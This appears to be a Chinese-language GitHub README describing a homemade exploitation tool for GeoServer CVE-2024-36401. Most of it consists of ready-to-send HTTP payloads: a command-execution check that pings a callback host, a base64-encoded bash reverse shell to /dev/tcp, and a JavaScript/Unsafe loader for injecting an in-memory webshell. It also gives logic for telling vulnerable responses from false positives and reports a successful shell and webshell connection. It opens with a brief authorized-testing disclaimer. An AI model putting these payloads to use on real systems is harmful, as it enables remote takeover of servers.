# geoserver CVE-2024-36401 漏洞利用工具

geoserver CVE-2024-36401  声明：仅用于授权测试，用户滥用造成的一切后果和作者无关 请遵守法律法规！

原本没打算写的，主要是想着直接去搜一下工具，直接用着方便就OK了

找到一个geoserver CVE-2024-36401漏洞利用工具

GeoServer 综合漏洞扫描工具V1.2 发布！

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/dsfdsf.png)

但是实际使用下来感觉到这个工具稍微有点miti，作者说是go语言写的

那么就想着能不能自己写一个试试

但是发现这个漏洞实际写下来，也没那么简单

那个作者说新版发布了,最新的版本是GeoServer 综合漏洞扫描工具V1.2，实际上发现他的新版也还是那样miti，原因在于，同样的站，他那个工具检测不到漏洞

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/fgdsgds.png)

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/dfsfsdf.png)

换成自己写的就可以检测到漏洞

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/fdgdfg.png)


简单说一下编写思路吧

1，默认payload:

POST /geoserver/wfs HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Host: xxxx
Accept-Language: en-US;q=0.9,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping wsn9.callback.red')</wfs:valueReference>
</wfs:GetPropertyValue>

那么注意这里： <wfs:Query typeNames='sf:archsites'/>

这个地方，如果你需要采取正则的方式去拿到，这个是sf:archsites网站的一个基本标识，你需要先拿到他的

<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>信息，然后你可以采取拼接的方式

判断漏洞的时候
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping wsn9.callback.red')</wfs:valueReference>
  
  这个地方，其实都不用去查找dns记录
  
  简单的逻辑就是判断是否存在异常的类
  
  如java.lang.ClassCastException
  
当然，这只是判断逻辑

这个回显本来就是400，这个地方容易踩坑，你需要判断错误页面后，进行数据查找

首先你需要请求一个
<wfs:ListStoredQueries service='WFS'\n" +
 " version='2.0.0'\n" +
 " xmlns:wfs='http://www.opengis.net/wfs/2.0'/>
 
 这个信息代表了你可以拿到他的<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>
 
 然后直接赋值给文本，然后再调一个函数方法，把文本的截取的信息，拼接到参数的<wfs:Query typeNames='sf:archsites'/>这里
 
 这条就会对判断的逻辑相对精准，检测类就这么写就可以了
 
 如果你只是一直使用 <wfs:Query typeNames='sf:archsites'/>，那么误判的几率很高，会提示找不到这个sf:archsites

 反弹类
 
我们看看反弹的payload:

POST /geoserver/wfs HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: JSESSIONID=5D030E92A0AFCC3B5006597E6524FD8D
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: application/xml
Content-Length: 438

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}')</wfs:valueReference>
</wfs:GetPropertyValue>

我们注意这里：

<wfs:Query typeNames='sf:archsites'/>

同样，先要正则取值然后拼接给他

然后直接请求

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx这里是加密过的base64

编写的时候，就把用户输入的bash -i >& /dev/tcp/127.0.0.1/9999 0>&1，转换成base64就可以了

然后发请求，同样，去找关键的异常类，判断逻辑即可

内存马注入类
这个地方
POST /geoserver/wfs HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Host: xxx
Accept-Language: en-US;q=0.9,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 20383

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>

这个地方还是有  <wfs:Query typeNames='sf:archsites'/>，老规矩，先取值

在star这里，放入你生成的base64的内存马加密代码

然后判断逻辑即可

容易踩坑的点
1、  <wfs:Query typeNames='sf:archsites'/>重复利用，误判几率98%，报错如下：

https://geoserver.epic.blue/geoserver/schemas/ows/1.1.0/owsAll.xsd">
<ows:Exception exceptionCode="InvalidParameterValue" locator="typeName">
<ows:ExceptionText>Could not locate {http://www.openplans.org/spearfish}archsites in catalog.<

存在漏洞的点：
<ows:Exception exceptionCode="NoApplicableCode">
<ows:ExceptionText>java.lang.ClassCastException: class java.lang.ProcessImpl cannot be cast to class org.opengis.feature.type.AttributeDescriptor (java.lang.ProcessImpl is in module java.base of loader &amp;apos;bootstrap&amp;apos;; org.opengis.feature.type.AttributeDescriptor is in unnamed module of loader org.apache.catalina.loader.ParallelWebappClassLoader @4b9df8a)
class java.lang.ProcessImpl cannot be cast to class org.opengis.feature.type.AttributeDescriptor (java.lang.ProcessImpl is in module java.base of loader &amp;apos;bootstrap&amp;apos;; org.opengis.feature.type.AttributeDescriptor is in unnamed module of loader org.apache.catalina.loader.ParallelWebappClassLoader @4b9df8a)</ows:ExceptionText>
</ows:Exception>

简单来讲存在漏洞就是java.lang.ClassCastException

误判就是Could not locate {http://www.openplans.org/spearfish}archsites in catalog

2、判断方式：
抓取调用的wfs:ReturnFeatureType>，赋给文本-文本调用函数方法，请求，拼接在请求，判断回显的异常

文本调用函数这里，需要提前给值，这样防止出现空指针异常，请求前拼接，判断回显的异常，是异常内进行判断

最终我们实现了这个漏洞利用工具的编写

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/dfdsfdf.png)

我们来测试一下漏洞

工具执行效果

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/fgfggf.png)

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/dfgdg.png)

提示：无回显和漏洞输出不存在是一样的，存在漏洞的会提示+号

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/dsfsdfsd.png)

我们检测到了漏洞，拿到了端点，反弹shell也成功了

接下来我们来试试注入内存马

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/gfdgfdg.png)

显示是成功注入内存马，我们来连接看看是否成功

![image](https://github.com/MInggongK/geoserver-/blob/main/geoservers/fdgdgds.png)

是可以连接的




















 
            

  

